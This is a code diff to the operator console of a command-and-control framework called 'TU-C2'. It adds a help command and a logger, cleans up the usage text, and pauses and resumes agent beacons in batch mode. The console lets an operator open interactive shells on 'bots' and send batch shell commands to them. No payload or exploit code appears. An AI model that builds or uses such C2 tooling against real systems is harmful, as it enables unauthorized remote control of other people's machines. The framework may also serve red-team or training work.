@@ -8,10 +8,11 @@ import queue
 import time
 
 class Interpreter(threading.Thread):
-    def __init__(self, agentList, listeners):
+    def __init__(self, agentList, listeners, logger):
         threading.Thread.__init__(self)     # Spawn a new thread for itself
         self.agentList = agentList
         self.listeners = listeners
+        self.logger = logger
 
     def run(self):
         # Start of a command history implementation, put on hold by stuff
@@ -19,12 +20,9 @@ class Interpreter(threading.Thread):
 
         self.printUsage()
 
-
-
         while True:
 
             # PRINT ALL AVAILABLE COMMANDS AND FUNCTIONS HERE
-            
             cmd = str(input("[TU-C2:CONSOLE]$ "))
 
             # TODO:
@@ -43,12 +41,13 @@ class Interpreter(threading.Thread):
             elif (cmd.strip(" ") == "exit"):
                 self.exit()
             elif (cmd.strip(" ") == "clear"):
-                os.system("clear")            
+                os.system("clear")
             elif (cmd.strip(" ") == "list-agents"):
                 self.listAgents()
             elif (cmd.strip(" ") == "batch-mode"):
                 self.batchMode()
-
+            elif (cmd.strip(" ") == "help"):
+                self.printUsage()
             elif (cmd.startswith("kill")):
                 try:
                     print(cmd)
@@ -90,16 +89,13 @@ class Interpreter(threading.Thread):
     def printUsage(self):
         print("[* Interpreter-Msg] Usage information:\n")
         print("[+ COMMANDS +]")
+        print("               - help          : Print this message")
+        print("               - interact <id> : Opens an interactive BASH/CMD prompt on the selected bot")
         print("               - exit          : Exits the program; Causes agents to sleep and retry every 10-45 seconds")
         print("               - clear         : Clears the screen; Presents a fresh terminal")
         print("               - list-agents   : Lists all active agents in use")
         print("               - interact <id> : Opens an interactive BASH/CMD prompt on the selected bot")
-        print("               - kill <id>     : Kill a connection to a specific bot. Causes bot process to exit. Will not recur. ")
-        print("               - interact <id> : Opens an interactive BASH/CMD prompt on the selected bot")
-        print("               - interact <id> : Opens an interactive BASH/CMD prompt on the selected bot")
-        
-
-
+        print("               - kill <id>     : Kill a connection to a specific bot. Causes bot process to exit. [* Will not recur *] ")
 
         print("                       + Commands:")
 
@@ -121,7 +117,7 @@ class Interpreter(threading.Thread):
         bm_success = False
         bm_entry = ''
 
-        # This loop is super shitty, fix it << but it works
+        # This loop is not good fix it << but it works
         while ('quit'.casefold().strip(" ") not in bm_entry):
             if(bm_success):
                 break
@@ -138,6 +134,7 @@ class Interpreter(threading.Thread):
                     for conn in self.agentList:
                         if conn.getID() in idlist:
                             batchList.append(conn)
+                            conn.stopBeacon()
                     bm_success = True
 
         time.sleep(0.3)
@@ -156,9 +153,16 @@ class Interpreter(threading.Thread):
                 batch_cmd = str(input("[TU-C2:BATCH-CMD]% "))
                 
                 if(batch_cmd.casefold().strip(" ") == "quit" or batch_cmd.casefold().strip(" ") == "q"):
+                    # Reset beacon variable to continue
+                    for conn in batchList:
+                        conn.startBeacon()
+
                     batchList.clear()
                     break
                 elif (batch_cmd.casefold().strip(" ") == "exit"):
+                    # Redundant?
+                    for conn in batchList:
+                        conn.startBeacon()
                     batchList.clear()
                     self.exit()
                 elif (batch_cmd.casefold().strip(" ") == "shell"):
@@ -177,6 +181,9 @@ class Interpreter(threading.Thread):
                     except Exception as ex:
                         print(f"[* Interpreter-Msg] Error with sending command or receiving output: {ex}")
                         print(f"[* Interpreter-Msg] Error: {ex}")
+
+
+        # RESET BEACON
 
         print(f"[* Interpreter-Msg] Exiting Batch-Mode... Returning to main-menu...")
 
